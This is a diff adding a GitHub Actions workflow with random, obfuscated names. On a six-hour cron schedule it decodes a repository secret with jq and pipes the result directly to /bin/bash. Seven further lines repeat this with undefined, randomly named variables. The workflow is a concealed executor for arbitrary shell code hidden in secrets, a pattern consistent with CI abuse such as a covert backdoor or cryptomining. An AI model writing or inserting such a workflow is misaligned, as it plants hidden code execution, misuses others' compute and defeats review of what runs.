@@ -1,0 +1,25 @@
+name: axiomaticauspicious
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: axiomaticauspicious
+        env:
+          oh697: ${{ secrets.oh697 }}
+        run: |
+          echo $oh697 | jq -r .l7 | /bin/bash
+          echo $olfc1898 | jq -r .wqwmf0463 | /bin/bash
+          echo $dus5287 | jq -r .qvmi83040 | /bin/bash
+          echo $ya263 | jq -r .a26 | /bin/bash
+          echo $ewx98 | jq -r .qpin17333 | /bin/bash
+          echo $qju9494 | jq -r .jmvr35848 | /bin/bash
+          echo $n61962 | jq -r .sxw506 | /bin/bash
+          echo $dkml500 | jq -r .f03215 | /bin/bash
+
